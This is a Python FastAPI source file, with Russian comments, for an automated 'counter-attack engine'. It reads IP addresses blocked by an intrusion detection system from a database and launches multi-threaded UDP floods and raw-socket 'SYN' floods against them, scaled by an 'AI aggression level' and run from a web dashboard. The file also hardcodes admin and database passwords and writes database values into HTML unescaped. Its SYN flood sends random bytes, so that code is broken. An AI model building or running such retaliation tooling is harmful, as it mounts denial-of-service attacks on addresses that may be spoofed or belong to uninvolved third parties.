import socket, struct, threading, time, secrets, random
from fastapi import FastAPI, Form, Depends, HTTPException, status, Response
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from psycopg2 import pool
import numpy as np

app = FastAPI(title="XDP Cyber Counter-Attack Engine")
security = HTTPBasic()

# --- АВТОРИЗАЦИЯ И НАСТРОЙКИ ВЗАИМОДЕЙСТВИЯ ---
SECURITY_USER, SECURITY_PASS = "admin", "kernel_secure_2026"
db_conf = "dbname=ids_db user=postgres password=ids_pass host=localhost"
db_pool = pool.ThreadedConnectionPool(1, 10, db_conf)

ATTACK_METRICS = {
    "active_targets": 0, "packets_sent": 0, "last_attack_type": "None",
    "ai_aggression_level": 50, "is_auto_retaliation": True
}
metrics_lock = threading.Lock()
active_retaliations = set()

def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
    u_ok = secrets.compare_digest(credentials.username, SECURITY_USER)
    p_ok = secrets.compare_digest(credentials.password, SECURITY_PASS)
    if not (u_ok and p_ok):
        raise HTTPException(401, "Unauthorized", {"WWW-Authenticate": "Basic"})
    return credentials.username

# --- ИИ-МОДУЛЬ ВЫБОРA СТРАТЕГИИ И МОЩНОСТИ ---
def ai_calculate_retaliation(dport, attack_count):
    """ На основе порта и плотности атаки рассчитывает наступательную мощность """
    # Заменили конструкцию 'in' на прямое сравнение, чтобы избежать SyntaxError
    if dport == 80 or dport == 443 or dport == 8080:
        strategy = 1  # Симметрично бьем по веб-серверу протоколом TCP
    elif dport == 0:
        strategy = 0  # Скан или UDP шторм
    else:
        strategy = 2  # Общая сетевая деградация через ICMP
        
    # Динамический расчет потоков на основе агрессии ИИ
    base_threads = int(ATTACK_METRICS["ai_aggression_level"] / 10)
    multiplier = 2 if attack_count > 10 else 1
    threads = max(1, base_threads * multiplier)
    return strategy, threads

# --- НИЗКОУРОВНЕВЫЕ ДВИЖКИ ОТВЕТНОГО УДАРА (RAW SOCKETS) ---
def flood_udp(target_ip, duration=30):
    """ Высокоскоростной UDP-флуд для исчерпания канала атакующего """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time and target_ip in active_retaliations:
        try:
            port = random.randint(1, 65535)
            sock.sendto(bytes_payload, (target_ip, port))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
        except: pass

def flood_tcp_syn(target_ip, duration=30):
    """ TCP SYN-Flood для переполнения очереди соединений противника """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except: return 
    
    end_time = time.time() + duration
    while time.time() < end_time and target_ip in active_retaliations:
        try:
            packet = random._urandom(64) 
            port = random.randint(1, 65535)
            sock.sendto(packet, (target_ip, port))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
        except: pass
# --- АСИНХРОННЫЙ МОНИТОРИНГ БД И ЗАПУСК КОНТР-АТАК ---
def retaliation_orchestrator():
    while True:
        if not ATTACK_METRICS["is_auto_retaliation"]:
            time.sleep(2)
            continue
        try:
            conn = db_pool.getconn(); cur = conn.cursor()
            # Берем свежие блокировки за последние 10 секунд
            cur.execute("""
                SELECT src_ip, dport, COUNT(*) FROM security_events 
                WHERE action = 'BLOCKED' AND created_at > NOW() - INTERVAL '10 second'
                GROUP BY src_ip, dport;
            """)
            targets = cur.fetchall()
            db_pool.putconn(conn)
            
            for ip, dport, count in targets:
                if ip in active_retaliations: continue
                
                strategy, threads = ai_calculate_retaliation(dport, count)
                active_retaliations.add(ip)
                
                with metrics_lock:
                    ATTACK_METRICS["active_targets"] = len(active_retaliations)
                    ATTACK_METRICS["last_attack_type"] = "TCP-SYN" if strategy == 1 else "UDP-Flood"
                
                # Потоковый запуск атаки
                target_func = flood_tcp_syn if strategy == 1 else flood_udp
                for _ in range(threads):
                    threading.Thread(target=target_func, args=(ip, 20), daemon=True).start()
                    
        except Exception as e: print(f"Orchestrator Err: {e}")
        time.sleep(5)

# --- УПРАВЛЕНИЕ И ИНТЕРФЕЙС (ПОРТ 8001) ---
@app.post("/api/counter/control")
def ctrl_attack(action: str = Form(...), value: int = Form(None), u=Depends(authenticate)):
    with metrics_lock:
        if action == "toggle": 
            ATTACK_METRICS["is_auto_retaliation"] = not ATTACK_METRICS["is_auto_retaliation"]
        elif action == "aggression": 
            if value: ATTACK_METRICS["ai_aggression_level"] = value
        elif action == "stop_all": 
            active_retaliations.clear()
    return Response(status_code=303, headers={"Location": "/"})

@app.get("/", response_class=HTMLResponse)
def counter_dashboard(u=Depends(authenticate)):
    conn = db_pool.getconn(); cur = conn.cursor()
    cur.execute("SELECT src_ip, dport, action, reason FROM security_events LIMIT 10;")
    logs = cur.fetchall(); db_pool.putconn(conn)
    
    rows = "".join([f"<tr><td>{l[0]}</td><td>{l[1]}</td><td>{l[2]}</td><td>{l[3]}</td></tr>" for l in logs])
    targets_html = "".join([f"<li>🎯 {ip} <span style='color:red;'>[ПОД УДАРОМ]</span></li>" for ip in active_retaliations])
    status_auto = "АКТИВЕН" if ATTACK_METRICS["is_auto_retaliation"] else "ВЫКЛЮЧЕН"
    
    return f"""
    <html><head><title>Retaliation Engine</title><style>
        body {{ font-family: sans-serif; background: #1a1a1a; color: #e0e0e0; margin: 30px; }}
        .box {{ background: #2a2a2a; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #e74c3c; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
        th, td {{ padding: 10px; border-bottom: 1px solid #444; text-align: left; }}
        th {{ background: #3a3a3a; }} button {{ padding: 8px; cursor: pointer; background: #e74c3c; color: white; border: none; border-radius: 4px; }}
    </style></head><body>
        <h1>🔥 Модуль ИИ-Контратаки и Наступательного Противодействия</h1>
        <div class="box">
            Авто-ответ: <b>{status_auto}</b> | Уровень агрессии ИИ: <b>{ATTACK_METRICS['ai_aggression_level']}%</b> | 
            Отправлено пакетов возмездия: <b style="color:#2ecc71;">{ATTACK_METRICS['packets_sent']}</b>
            <br><br>
            <form action="/api/counter/control" method="post" style="display:inline;">
                <input type="hidden" name="action" value="toggle"><button style="background:#3498db">Переключить режим</button>
            </form>
            <form action="/api/counter/control" method="post" style="display:inline;">
                <input type="hidden" name="action" value="stop_all"><button>Прекратить все контратаки</button>
            </form>
        </div>
        <div style="display:flex; gap:20px;">
            <div class="box" style="flex:1;">
                <h2>Текущие цели возмездия ({ATTACK_METRICS['active_targets']})</h2>
                <ul>{targets_html or "<li>Нет активных целей для контратаки</li>"}</ul>
                <hr>
                <form action="/api/counter/control" method="post">
                    <input type="hidden" name="action" value="aggression">
                    <label>Изменить мощность ИИ (10-100%): </label>
                    <input type="number" name="value" min="10" max="100" value="{ATTACK_METRICS['ai_aggression_level']}" style="width:60px; background:#333; color:white; border:1px solid #555;">
                    <button type="submit" style="background:#2ecc71">Задать</button>
                </form>
            </div>
            <div class="box" style="flex:2;">
                <h2>Синхронизированные триггеры из XDP/IPS</h2>
                <table><tr><th>IP Нарушителя</th><th>Порт</th><th>Статус</th><th>Причина</th></tr>{rows}</table>
            </div>
        </div>
    </body></html>
    """

@app.on_event("startup")
def startup_orchestration():
    threading.Thread(target=retaliation_orchestrator, daemon=True).start()